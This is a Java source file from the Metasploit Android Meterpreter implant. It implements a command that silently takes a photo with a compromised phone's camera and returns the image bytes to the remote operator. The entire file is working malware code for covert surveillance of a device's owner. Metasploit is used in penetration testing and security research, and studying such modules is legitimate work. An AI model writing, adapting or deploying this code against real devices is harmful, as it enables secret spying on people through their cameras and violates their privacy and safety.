
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.util.Log;

public class webcam_get_frame_android extends webcam_audio_record implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WEBCAM_IMAGE = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 1);
    private static final int TLV_TYPE_WEBCAM_QUALITY = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 3);

    private volatile byte[] cameraData;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        @SuppressWarnings("unused")
        int quality = request.getIntValue(TLV_TYPE_WEBCAM_QUALITY);
                
        try {
            if (webcam_start_android.camera == null) {
                return ERROR_FAILURE;
            }

            cameraData = null;
            webcam_start_android.camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    cameraData = data;
                }
            });

            int i = 0;
            while (cameraData == null && i < 20) {
                Thread.sleep(1000);
                i++;
            }

            response.add(TLV_TYPE_WEBCAM_IMAGE, cameraData);
        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), "webcam error ", e);
        }

        return ERROR_SUCCESS;
    }
}
